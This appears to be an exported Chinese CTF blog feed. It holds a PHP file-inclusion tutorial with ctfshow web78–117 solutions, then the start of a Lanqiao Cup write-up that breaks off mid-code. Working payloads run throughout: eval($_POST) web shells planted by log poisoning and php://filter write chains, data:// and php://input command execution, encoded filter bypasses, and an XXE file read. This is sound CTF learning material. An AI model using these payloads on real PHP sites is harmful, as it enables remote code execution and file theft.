<li><code>&quot;w&quot;</code> 参数表示以写模式打开文件。如果文件已经存在，则会清空文件内容并重新写入。</li>
</ul>
<p>​	②**<code>fwrite()</code>**：</p>
<ul>
<li><code>fwrite()</code> 函数将 <code>&lt;?php eval($_POST[123]);?&gt;</code> 这个字符串写入到 <code>shell.php</code> 文件中。</li>
<li><code>eval()</code> 是一个非常危险的 PHP 函数，它会执行其参数中的 PHP 代码。在这个例子中，<code>eval($_POST[123]);</code> 会执行通过 HTTP POST 请求中传入的名为 <code>123</code> 的参数所包含的 PHP 代码。</li>
</ul>
<p>找到路径之后可以用蚂剑连接或者url后面直接搞</p>
<h3 id="2-包含Apache日志文件">2.包含Apache日志文件</h3>
<p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
<p>日志的目录一般会变怎样查看日志的目录？需要读取服务器配置文件(httpd.conf,ngix.conf…)或者根据phpinfo();得知(在phpinfo里搜error_log如果后面的值为空，则为默认地址。（<strong>对于Apache，日志存放路径：/var/log/apache/access.log<br>
对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</strong> )</p>
<p>怎样看是Apache或者Ngix？在响应头的sever里</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log</p>
<h3 id="3-包含SESSION文件">3.包含SESSION文件</h3>
<p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<h3 id="4-包含临时文件">4.包含临时文件</h3>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
<h2 id="四、远程文件包含-RFI">四、远程文件包含(RFI)</h2>
<p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
<h2 id="五、PHP伪协议">五、PHP伪协议</h2>
<p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数</p>
<p>如表所示</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>访问本地文件系统</td>
</tr>
<tr>
<td>http://</td>
<td>访问HTTP(s)网址</td>
</tr>
<tr>
<td>ftp://</td>
<td>访问FTP(s)URLs</td>
</tr>
<tr>
<td>php://</td>
<td>访问各个输出/输出流(I/O streams)</td>
</tr>
<tr>
<td>zlib://</td>
<td>压缩流</td>
</tr>
<tr>
<td>data://</td>
<td>数据(RFC 2397)</td>
</tr>
<tr>
<td>glob://</td>
<td>查找匹配的文件路径模式</td>
</tr>
</tbody>
</table>
<h3 id="1-file-协议">1.file://协议</h3>
<p><strong>file://</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p><strong>file:// [文件的绝对路径和文件名]</strong></p>
<h3 id="2-php-协议">2.php://协议</h3>
<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input<br>
php://filter用于读取源码。<br>
php://input用于执行php代码。</p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br>
<strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
<h3 id="3-ZIP-协议">3.ZIP://协议</h3>
<p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
<h3 id="4-data-协议">4.data://协议</h3>
<p>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
<p>利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="5-伪协议利用条件">5.伪协议利用条件</h3>
<table>
<thead>
<tr>
<th>协议</th>
<th>测试 PHP 版本</th>
<th>allow_url_fopen</th>
<th style="text-align:center">allow_url_include</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td>
</tr>
<tr>
<td>php://filter</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=php://filter/read=convert.base64 - encode/resource=./index.php</td>
</tr>
<tr>
<td>php://input</td>
<td>&gt;=5.2</td>
<td>on</td>
<td style="text-align:center">on</td>
<td>?file=php://input 【POST DATA】</td>
</tr>
<tr>
<td>zip://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt</td>
</tr>
<tr>
<td>compress.bzip2://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2 【or】 ?file=compress.bzip2://./file.bz2</td>
</tr>
<tr>
<td>compress.zlib://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz 【or】 ?file=compress.zlib://./file.gz</td>
</tr>
</tbody>
</table>
<h2 id="六、文件包含漏洞防护">六、文件包含漏洞防护</h2>
<p>1、使用str_replace等方法过滤掉危险字符</p>
<p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
<p>3、php版本升级，防止%00截断</p>
<p>4、对上传的文件进行重命名，防止被读取</p>
<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
<p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化<br>
————————————————</p>
<pre><code>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
</code></pre>
<p>原文链接：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>
<p>举一反三：</p>
<p><img src="/2025/01/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250122172011834.png" alt="image-20250122172011834"></p>
<p>通过这个知识点的介绍我们联想一下：在之前我们做题时，我们传进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
<p>可能无法查看phpinfo()，那我们用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php phpinfo(); ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>是不是可以拿到phpinfo()？（web78可以）</p>
<h1>web78</h1>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中有一个include包含，那我们是不是可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;); ?&gt;</span></span><br><span class="line">    </span><br><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>ctfshow{950b168a-e2de-4fbb-9daa-11260a8af088}</p>
<h1>web79</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源码把我们的php给替换成三个问号，那我们用base64加密一下就可以了</p>
<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</p>
<p>ctfshow{2751c0eb-edde-4e4f-a845-64cca68c1863}</p>
<h1>web80</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>对于Apache，日志存放路径：/var/log/apache/access.log<br>
对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</strong></p>
<p>响应头里面可以看是Aoache还是Ngnix</p>
<p><img src="/2025/01/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250122195554595.png" alt="image-20250122195554595"></p>
<p>但有时候日志目录会改变，需要找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">User-Agent=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">方法二（这个不行，因为过滤了php）</span><br><span class="line">php:<span class="comment">//input可以把POST的内容作为php代码执行</span></span><br><span class="line"></span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>都可以用蚂剑连接post，但是需要知道日志的目录，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p>ctfshow{8d557bc7-1379-4a37-b5c1-2497fcef48e2}</p>
<h1>web81</h1>
<p>还是日志</p>
<p>ctfshow{11544a11-2a2e-4667-8a84-15b260e4d33c}</p>
<h1>web82-86</h1>
<p><strong>竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</strong></p>
<p>那现在不做了</p>
<h1>web87</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们正常看到的url是url编码过的，在hackbar里面如果有空格的话，它自己会把空格转成%20再上传，在服务器里面他又会自己解码成空格。</p>
<p>在源码当中有一个urldecode($file)，他会把我们是$file进行一次url解码一次。根据上一段，我们推断：我们的?file=后面的东西需要进行两次url加密(all)。</p>
<p>源码当中有<?php die('大佬别秀了');?>，他会终止代码运行，导致我们post的conten无法运行，那么我们可以</p>
<p>使用filter，然后进行base64解码。因为我们知道：base64里面是大小写字母加数字外还有+和/，没有其他的符号了，总共64个。那么我们把file_put_contents后面的&quot;<?php die('大佬别秀了');?>&quot;.$content写进一个1.php文件里面，并对1.php使用php://filter/write协议的base64加密。那么die()函数就失效了。因为经过base64之后，其内容变成了phpdie，那么我们把post的content的内容改为经过base64加密的<?php eval($_POST[a]); ?>就可以在1.php里面写入一个一句话木马。然后通过一句话木马拿到flag</p>
<p>由于base64的编码必须为4的倍数，所以，我们在<?php eval($_POST[a]); ?>前面随便加两个base64里面有的字符就可以了，以便和前面我们破坏城的phpdie凑成8个。</p>
<p>过程：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line"></span><br><span class="line">content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg==</span><br><span class="line"></span><br><span class="line">之后</span><br><span class="line"></span><br><span class="line">url/<span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>ctfshow{ec5c4e6c-2b7a-48b2-b297-47b9597f2635}</p>
<p>另一种方法：php://filter/write=string.rot13/resource=1.php</p>
<p>rot13：将字母按照字母表的顺序递进13次</p>
<p>通过位移将原来的 <?php die('大佬别秀了');?> 变成 <?cuc qvr('大佬别秀了');?></p>
<p>?file=php://filter/write=string.rot13/resource=1.php</p>
<p>?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</p>
<p>content=<?php system('cat f*');?></p>
<p>content=<?cuc flfgrz('gnp s*.cuc');?></p>
<h1>web88</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?file=data://text/plain;base64,&lt;?php system(‘tac fl*’);</p>
<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7</p>
<p>ctfshow{1831aaaa-8728-4d78-92a7-bd81f724b308}</p>
<h1>web116</h1>
<p>misc和web结合的题目</p>
<p>下载视频foremost分离</p>
<p>?file=flag.php</p>
<p>bp抓包</p>
<p>ctfshow{0a660000-a7ba-4b5e-b76c-d299aad214a0}</p>
<h1>web117</h1>
<p>UCS-2编码转换:对目标字符串进行2位一反转</p>
<p>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</p>
<p>contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
<p>ctfshow{3b47fcc8-c7cd-453d-b807-fb93b3395516}</p>
<p>还有UCS-4</p>
<h1>凌晨4点，玩会儿手机睡觉了，web82-86竞争环境，明天凌晨再搞了</h1>
<h1>web82-86由于需要图例展示，又开了一篇新的，请移步</h1>
]]></content>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯部分wp</title>
    <url>/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>带一个*的为拿到flag的,带两个**的为差点拿到flag的题目</p>
<h1><strong>蓝桥杯</strong></h1>
<h2 id="ezEvtx"><strong>ezEvtx</strong>*</h2>
<p>给了一个文件events.evtx</p>
<p>打开之后是类似于取证题目,根据题目提示,这是一个win下的日志,要我们拿到黑客读取的敏感文件全称</p>
<p>打开之后看到看到一堆东西,我们点一下级别进行排序,</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps1.jpg" alt="img"></p>
<p>文件名为confidential.docx</p>
<p>那么flag就是flag{confidential.docx }</p>
<h2 id="星际XML解析器"><strong>星际XML解析器</strong>*</h2>
<p>根据题目和提示,这就是一道xxe题目</p>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [

<!ENTITY xxe SYSTEM "file:///flag">
<p>]&gt;</p>
<root>
<p><sszlovezmr>&amp;xxe;</sszlovezmr></p>
</root>
<p>直接就拿到flag了flag{7c6c1410-bc01-4724-add8-7fed1b844743}</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps2.jpg" alt="img"></p>
<h2 id="Enigma"><strong>Enigma</strong>*</h2>
<p>打开附件复制内容</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps3.jpg" alt="img"></p>
<p>ILBDA MHSWX MORNZ DDDOT KUYZA VSBJC</p>
<p>打开解码工具进行解码</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps4.jpg" alt="img"></p>
<p>HELLO CTFER THISI SAMES SAGEF ORYOU</p>
<p>Flag就是flag{HELLOCTFERTHISISAMESSAGEFORYOU}</p>
<h2 id="flowzip">flowzip**</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There are many zip files.</span><br></pre></td></tr></table></figure>
<p>我是傻逼,tm刚开始wireshark打开右下角是没有看全的,如图所示</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/image-20250426155249069.png" alt="image-20250426155249069"></p>
<p>刚开始看到有一堆zip,还想着给他贴到010然后解压,然后flag在这里直接可以看到,真二啊wc.但是也值得反思</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/image-20250426155422474.png" alt="image-20250426155422474"></p>
<p>flag{c6db63e6-6459-4e75-bb37-3aec5d2b947b}</p>
<h2 id="黑客密室逃脱"><strong>黑客密室逃脱</strong>**</h2>
<p>信息收集:</p>
<ol>
<li></li>
</ol>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps5.jpg" alt="img">2.</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps6.jpg" alt="img"></p>
<p>\3.</p>
<p><img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps7.jpg" alt="img">4.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># author: gamelab</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟敏感信息</span></span><br><span class="line">sensitive_info = SENSITIVE_INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密密钥</span></span><br><span class="line">encryption_key = ENCRYPTION_KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        char = text[i]</span><br><span class="line">        key_char = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(char) + <span class="built_in">ord</span>(key_char))</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">encrypted_sensitive_info = simple_encrypt(sensitive_info, encryption_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟日志文件内容</span></span><br><span class="line">log_content = <span class="string">f&quot;用户访问了 /secret 页面，可能试图获取 <span class="subst">&#123;encrypted_sensitive_info&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟隐藏文件内容</span></span><br><span class="line">hidden_file_content = <span class="string">f&quot;解密密钥: <span class="subst">&#123;encryption_key&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定安全的文件根目录</span></span><br><span class="line">SAFE_ROOT_DIR = os.path.abspath(<span class="string">&#x27;/app&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(SAFE_ROOT_DIR, <span class="string">&#x27;hidden.txt&#x27;</span>), <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hidden_file_content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logs&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logs</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span 